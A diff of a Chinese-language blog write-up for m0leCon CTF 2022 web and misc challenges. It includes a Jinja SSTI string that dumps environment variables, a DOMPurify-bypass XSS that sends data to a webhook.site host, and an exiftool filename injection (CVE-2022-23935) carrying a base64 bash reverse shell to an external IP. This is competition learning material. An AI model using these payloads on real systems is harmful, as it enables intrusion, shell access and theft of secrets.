@@ -20,25 +20,25 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="m0leCon CTF 2022webhack(pt)MD Hey, do you like markdown? Author: @Xato hackptmd.zip  jackma:123456 Dumb Forum You’re telling me you can’t break such a simple forum  flag在环境变量里 1ENV FLAG&#x3D;&amp;#x27;ptm&amp;#123">
+    <meta name="description" content="m0leCon CTF 2022webhack(pt)MD Hey, do you like markdown? Author: @Xato hackptmd.zip  jackma:123456 可以看到 编写markdown界面的 csp 1&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-">
 <meta property="og:type" content="article">
 <meta property="og:title" content="m0leCon-CTF-2022">
 <meta property="og:url" content="http://example.com/2022/05/14/m0leCon-CTF-2022/index.html">
 <meta property="og:site_name" content="b1ue0cean&#39;s   blog">
-<meta property="og:description" content="m0leCon CTF 2022webhack(pt)MD Hey, do you like markdown? Author: @Xato hackptmd.zip  jackma:123456 Dumb Forum You’re telling me you can’t break such a simple forum  flag在环境变量里 1ENV FLAG&#x3D;&amp;#x27;ptm&amp;#123">
+<meta property="og:description" content="m0leCon CTF 2022webhack(pt)MD Hey, do you like markdown? Author: @Xato hackptmd.zip  jackma:123456 可以看到 编写markdown界面的 csp 1&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516115839423.png">
 <meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220514124017454.png">
 <meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516085548423.png">
 <meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516090947866.png">
 <meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516092701535.png">
 <meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516092318248.png">
-<meta property="og:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516110844914.png">
 <meta property="article:published_time" content="2022-05-14T03:57:39.000Z">
-<meta property="article:modified_time" content="2022-05-16T03:08:49.312Z">
+<meta property="article:modified_time" content="2022-05-16T04:33:17.026Z">
 <meta property="article:author" content="b1ue0cean">
 <meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220514124017454.png">
+<meta name="twitter:image" content="http://example.com/2022/05/14/m0leCon-CTF-2022/image-20220516115839423.png">
 
 
 <link rel="canonical" href="http://example.com/2022/05/14/m0leCon-CTF-2022/">
@@ -157,7 +157,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#m0leCon-CTF-2022"><span class="nav-number">1.</span> <span class="nav-text">m0leCon CTF 2022</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hack-pt-MD"><span class="nav-number">2.1.</span> <span class="nav-text">hack(pt)MD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dumb-Forum"><span class="nav-number">2.2.</span> <span class="nav-text">Dumb Forum</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LESN"><span class="nav-number">3.</span> <span class="nav-text">LESN</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#m0leCon-CTF-2022"><span class="nav-number">1.</span> <span class="nav-text">m0leCon CTF 2022</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hack-pt-MD"><span class="nav-number">1.1.1.</span> <span class="nav-text">hack(pt)MD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dumb-Forum"><span class="nav-number">1.1.2.</span> <span class="nav-text">Dumb Forum</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%91%E7%9A%84zz%E5%81%9A%E9%A2%98%E7%BB%8F%E5%8E%86"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">我的zz做题经历</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LESN"><span class="nav-number">1.1.3.</span> <span class="nav-text">LESN</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">1.2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Placey"><span class="nav-number">1.2.1.</span> <span class="nav-text">Placey</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -275,7 +275,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-05-16 11:08:49" itemprop="dateModified" datetime="2022-05-16T11:08:49+08:00">2022-05-16</time>
+      <time title="Modified: 2022-05-16 12:33:17" itemprop="dateModified" datetime="2022-05-16T12:33:17+08:00">2022-05-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -297,13 +297,29 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="m0leCon-CTF-2022"><a href="#m0leCon-CTF-2022" class="headerlink" title="m0leCon CTF 2022"></a><strong>m0leCon CTF 2022</strong></h2><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="hack-pt-MD"><a href="#hack-pt-MD" class="headerlink" title="hack(pt)MD"></a>hack(pt)MD</h3><blockquote>
+        <h1 id="m0leCon-CTF-2022"><a href="#m0leCon-CTF-2022" class="headerlink" title="m0leCon CTF 2022"></a><strong>m0leCon CTF 2022</strong></h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="hack-pt-MD"><a href="#hack-pt-MD" class="headerlink" title="hack(pt)MD"></a>hack(pt)MD</h3><blockquote>
 <p>Hey, do you like <a target="_blank" rel="noopener" href="https://hackptmd.m0lecon.fans/">markdown</a>?</p>
 <p><em>Author: @Xato</em></p>
 <p><a target="_blank" rel="noopener" href="https://ctf.m0lecon.it/attachments/8bb18abd5afe427a9fe785c5ffb32205/hackptmd.zip">hackptmd.zip</a></p>
 </blockquote>
 <p><code>jackma:123456</code></p>
-<h3 id="Dumb-Forum"><a href="#Dumb-Forum" class="headerlink" title="Dumb Forum"></a>Dumb Forum</h3><blockquote>
+<p>可以看到 编写markdown界面的 csp</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;unsafe-url&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;3;url=https://webhook.site/3468de44-3fe9-4692-ab8e-373fa43ea184&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>emm 会在3s后自动跳转</p>
+<p>Create another note that embeds the first one in the right position so that the bot click on the logout button causes the iframe to navigate to <code>/last</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;/document/3b93e42c-55bd-4929-9f4e-8294159201f8&quot;</span> <span class="attr">style</span>=<span class="string">&quot;z-index:2; position:absolute; top:0px; right:-120px; height:100px&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/document/649487e4<span class="string">-5</span>f86<span class="string">-4</span>aff<span class="string">-83</span>d9-ef509e21d02d</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/14/m0leCon-CTF-2022/image-20220516115839423.png" alt="image-20220516115839423" style="zoom:33%;">
+
+<p>貌似就是把flag的document的地址给leak出来</p>
+<p>这个 <code>iframe</code> 的位置似乎有讲究 </p>
+<p>模拟一下 <code>$(&quot;#logout&quot;).click();</code></p>
+<h3 id="Dumb-Forum"><a href="#Dumb-Forum" class="headerlink" title="Dumb Forum"></a>Dumb Forum</h3><h4 id="我的zz做题经历"><a href="#我的zz做题经历" class="headerlink" title="我的zz做题经历"></a>我的zz做题经历</h4><blockquote>
 <p>You’re telling me you can’t break such a simple <a target="_blank" rel="noopener" href="https://microforum.m0lecon.fans/">forum</a></p>
 </blockquote>
 <p>flag在环境变量里</p>
@@ -337,24 +353,15 @@
 
 
 
-
-
-<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ls pwn</span><br><span class="line">ls: cannot <span class="keyword">access</span> <span class="symbol">&#x27;pwn</span>&#x27;: No such <span class="keyword">file</span> <span class="keyword">or</span> directory</span><br><span class="line">$ touch <span class="symbol">&#x27;touch</span> pwn |&#x27;</span><br><span class="line">$ ./exiftool <span class="symbol">&#x27;touch</span> pwn |&#x27;</span><br><span class="line">ExifTool Version Number         : <span class="number">12.37</span></span><br><span class="line"><span class="keyword">File</span> Name                       : touch pwn |</span><br><span class="line">Directory                       : .</span><br><span class="line"><span class="keyword">File</span> Size                       : <span class="number">0</span> bytes</span><br><span class="line"><span class="keyword">File</span> Modification Date/<span class="built_in">Time</span>     : <span class="number">2022</span>:<span class="number">01</span>:<span class="number">18</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">18</span>-<span class="number">06</span>:<span class="number">00</span></span><br><span class="line"><span class="keyword">File</span> <span class="keyword">Access</span> Date/<span class="built_in">Time</span>           : <span class="number">2022</span>:<span class="number">01</span>:<span class="number">18</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">18</span>-<span class="number">06</span>:<span class="number">00</span></span><br><span class="line"><span class="keyword">File</span> Inode Change Date/<span class="built_in">Time</span>     : <span class="number">2022</span>:<span class="number">01</span>:<span class="number">18</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">18</span>-<span class="number">06</span>:<span class="number">00</span></span><br><span class="line"><span class="keyword">File</span> Permissions                : prw<span class="comment">-------</span></span><br><span class="line"><span class="literal">Error</span>                           : <span class="keyword">File</span> <span class="keyword">is</span> empty</span><br><span class="line">$ ls pwn</span><br><span class="line">pwn</span><br></pre></td></tr></table></figure>
-
-<p>想办法构造</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> https://webhook.site/<span class="number">3468</span>de44-<span class="number">3</span>fe9-<span class="number">4692</span>-ab8e-<span class="number">373</span>fa43ea184 |</span><br></pre></td></tr></table></figure>
-
-<p>想一下怎么去掉前缀就行</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/xxx/</span>xxx<span class="regexp">/curl https:/</span><span class="regexp">/webhook.site/</span><span class="number">3468</span>de44-<span class="number">3</span>fe9-<span class="number">4692</span>-ab8e-<span class="number">373</span>fa43ea184 |</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Failed</span> check image type: &#123;&amp;#<span class="number">34</span>;exception&amp;#<span class="number">34</span>;: &amp;#<span class="number">34</span>;ExifToolExecuteError(&amp;#<span class="number">39</span>;execute returned a non-zero exit status: <span class="number">1</span>&amp;#<span class="number">39</span>;)&amp;#<span class="number">34</span>;, &amp;#<span class="number">34</span>;status&amp;#<span class="number">34</span>;: <span class="number">1</span>, &amp;#<span class="number">34</span>;stdout&amp;#<span class="number">34</span>;: &amp;#<span class="number">34</span>;[&#123;\n  \&amp;#<span class="number">34</span>;SourceFile\&amp;#<span class="number">34</span>;: \&amp;#<span class="number">34</span>;avatars/<span class="number">131</span>/|\&amp;#<span class="number">34</span>;\n&#125;]\n&amp;#<span class="number">34</span>;, &amp;#<span class="number">34</span>;stderr&amp;#<span class="number">34</span>;: &amp;#<span class="number">34</span>;Can&amp;#<span class="number">39</span>;t exec \&amp;#<span class="number">34</span>;avatars/<span class="number">131</span>/\&amp;#<span class="number">34</span>;: Permission denied at /usr/share/perl5/Image/ExifTool.pm line <span class="number">4130</span>.\nError: Error opening file - avatars/<span class="number">131</span>/|\n&amp;#<span class="number">34</span>;&#125;. Powered by ExifTool <span class="number">12</span>.<span class="number">37</span></span><br></pre></td></tr></table></figure>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">self.__init__.__globals__.sys.modules.os.environ</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/101.43.33.148/</span><span class="number">10099</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">base64版：bash -c <span class="string">&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMzMuMTQ4LzEwMDk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p>这么绕过?</p>
-<h2 id="LESN"><a href="#LESN" class="headerlink" title="LESN"></a>LESN</h2><p>周六一天实验  中午晚上看了看比赛 没时间看这题 晚上来复现一下</p>
+
+
+
+<h3 id="LESN"><a href="#LESN" class="headerlink" title="LESN"></a>LESN</h3><p>周六一天实验  中午晚上看了看比赛 没时间看这题 晚上来复现一下</p>
 <p>上传一张正确的图片后 毛用都没有</p>
 <p>上传错误的图片后 可以发现</p>
 <img src="/2022/05/14/m0leCon-CTF-2022/image-20220516085548423.png" alt="image-20220516085548423" style="zoom:67%;">
@@ -377,19 +384,29 @@
 
 <p>但我们发现 他还对payload进行了过滤 所以我们还要绕过过滤才行</p>
 <p>看了wp 应该是用了过时的 Dompurify  </p>
-<p>然后拿以前版本的绕过来进行xss</p>
-<p>好了现在我们可以xss了</p>
-<p>我们先挂一个正确的图片的地址 （可以在本地  这样到了bot还会正常报错 是我们的payload成功执行）</p>
+<p>然后拿以前版本的绕过来进行xss 具体payload见上面wp</p>
+<p>如何打:</p>
+<p>我们先挂一个正确的图片的地址 （可以在本地  这样到了bot还会正常报错 使得我们的payload成功执行）</p>
 <p>但有一个问题就是script加载后 会有缓存 会导致我们的payload失效</p>
-<p>为了避免缓存的话 可以再开一个 页面 用 iframe 来加载</p>
+<p>为了避免缓存的话 可以再开一个post 页面 用 iframe 来加载</p>
+<p>然后将bot重定向到我们的恶意iframe页面就ok</p>
+<p>flag在admin的 /post</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a class=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">mailto:</span>&#x27;<span class="attr">a</span>&#x27;;<span class="attr">eval</span>(<span class="attr">atob</span>(&#x27;<span class="attr">ZmV0Y2goJy9wb3N0JykudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT57eD0vcG9zdFwvW1x3LV0qL2cuZXhlYyh0KTtmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvMzQ2OGRlNDQtM2ZlOS00NjkyLWFiOGUtMzczZmE0M2VhMTg0LycreFswXSl9KS8v</span>&#x27;)) <span class="attr">id</span>=<span class="string">redirect_error_image</span> &gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>base64部分</p>
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;/post&#x27;</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="built_in">text</span>()).then(<span class="function"><span class="params">t</span>=&gt;</span>&#123;x=<span class="regexp">/post\/[\w-]*/g</span>.exec(t);fetch(<span class="string">&#x27;https://webhook.site/3468de44-3fe9-4692-ab8e-373fa43ea184/&#x27;</span>+x[<span class="number">0</span>])&#125;)<span class="comment">//</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/05/14/m0leCon-CTF-2022/image-20220516110844914.png" alt="image-20220516110844914"></p>
+<p>拓展:</p>
 <p><a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/xss-naxienian/content/9.html">https://wizardforcel.gitbooks.io/xss-naxienian/content/9.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/12cases-about-xss-part1/#iframe%E7%9A%84windowname%E8%B7%A8%E5%9F%9F%E4%BC%A0%E8%BE%93">https://blog.xray.cool/post/12cases-about-xss-part1/#iframe%E7%9A%84windowname%E8%B7%A8%E5%9F%9F%E4%BC%A0%E8%BE%93</a></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Placey"><a href="#Placey" class="headerlink" title="Placey"></a>Placey</h3><p>比赛后十分钟打出来了 （做了一天实验 不然早该出了 </p>
+<p>CVE-2022-23935 <a target="_blank" rel="noopener" href="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429">https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2333.txt;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMzMuMTQ4LzEwMDk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; |</span><br></pre></td></tr></table></figure>
+
+<p>base64 绕过来反弹shell</p>
+<p>然后进去后 有个redis的cve</p>
+<p> <a target="_blank" rel="noopener" href="https://www.adminxe.com/3620.html">https://www.adminxe.com/3620.html</a> </p>
+<p>照着打就出了</p>
 
     </div>
 
